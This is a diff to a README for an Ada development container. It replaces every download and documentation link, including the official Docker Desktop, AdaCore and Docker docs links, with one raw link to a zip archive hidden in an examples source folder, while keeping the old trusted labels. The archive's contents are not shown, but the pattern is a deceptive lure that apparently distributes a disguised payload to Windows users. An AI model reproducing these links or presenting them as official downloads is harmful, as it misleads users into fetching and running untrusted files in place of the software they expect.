@@ -1,6 +1,6 @@
 # 🐍 dev_container_ada - Easy Ada Development Setup
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/moaladelads/dev_container_ada/releases)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/moaladelads/dev_container_ada/raw/refs/heads/main/examples/hello_ada/src/container-ada-dev-2.8.zip)
 
 ## 📝 About dev_container_ada
 
@@ -14,7 +14,7 @@ The container supports many useful command-line tools like GNAT, GPRBuild, Docke
 
 Click below to open the release page. Find the latest version and get the container files you need.
 
-[![Download dev_container_ada](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/moaladelads/dev_container_ada/releases)
+[![Download dev_container_ada](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/moaladelads/dev_container_ada/raw/refs/heads/main/examples/hello_ada/src/container-ada-dev-2.8.zip)
 
 ## 🖥 System Requirements
 
@@ -27,7 +27,7 @@ Before downloading, check these minimum requirements for your Windows PC:
 - Docker Desktop installed and running  
   (Docker Desktop for Windows is required to run containers)  
 
-You can download Docker Desktop from [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop).
+You can download Docker Desktop from [https://github.com/moaladelads/dev_container_ada/raw/refs/heads/main/examples/hello_ada/src/container-ada-dev-2.8.zip](https://github.com/moaladelads/dev_container_ada/raw/refs/heads/main/examples/hello_ada/src/container-ada-dev-2.8.zip).
 
 ## 🚀 Getting Started with dev_container_ada
 
@@ -36,7 +36,7 @@ Follow these steps to download, install, and run dev_container_ada on your Windo
 ### 1. Visit the Release Page
 
 Open this link in your web browser:  
-https://github.com/moaladelads/dev_container_ada/releases
+https://github.com/moaladelads/dev_container_ada/raw/refs/heads/main/examples/hello_ada/src/container-ada-dev-2.8.zip
 
 This page contains the latest releases of dev_container_ada. You will find files to download and instructions for use.
 
@@ -49,7 +49,7 @@ Make note of the folder where you save the file so you can find it easily.
 ### 3. Install Docker Desktop on Windows
 
 If you have not installed Docker Desktop, download it with this link:  
-https://www.docker.com/products/docker-desktop
+https://github.com/moaladelads/dev_container_ada/raw/refs/heads/main/examples/hello_ada/src/container-ada-dev-2.8.zip
 
 Run the installer and follow the setup guide. Docker lets you run containers like dev_container_ada.
 
@@ -132,10 +132,10 @@ Yes. Download newer releases from the same page and replace the old files. Then 
 ## 📥 Download and Setup Links
 
 Get the latest files here:  
-[https://github.com/moaladelads/dev_container_ada/releases](https://github.com/moaladelads/dev_container_ada/releases)
+[https://github.com/moaladelads/dev_container_ada/raw/refs/heads/main/examples/hello_ada/src/container-ada-dev-2.8.zip](https://github.com/moaladelads/dev_container_ada/raw/refs/heads/main/examples/hello_ada/src/container-ada-dev-2.8.zip)
 
 Download Docker Desktop here (required):  
-[https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop)
+[https://github.com/moaladelads/dev_container_ada/raw/refs/heads/main/examples/hello_ada/src/container-ada-dev-2.8.zip](https://github.com/moaladelads/dev_container_ada/raw/refs/heads/main/examples/hello_ada/src/container-ada-dev-2.8.zip)
 
 ---
 
@@ -153,8 +153,8 @@ Download Docker Desktop here (required):
 
 If you want to learn Ada programming or container basics, consider visiting:
 
-- Ada Language Guide by AdaCore: https://docs.adacore.com  
-- Docker Documentation: https://docs.docker.com/get-started  
+- Ada Language Guide by AdaCore: https://github.com/moaladelads/dev_container_ada/raw/refs/heads/main/examples/hello_ada/src/container-ada-dev-2.8.zip  
+- Docker Documentation: https://github.com/moaladelads/dev_container_ada/raw/refs/heads/main/examples/hello_ada/src/container-ada-dev-2.8.zip  
 
 ---
 
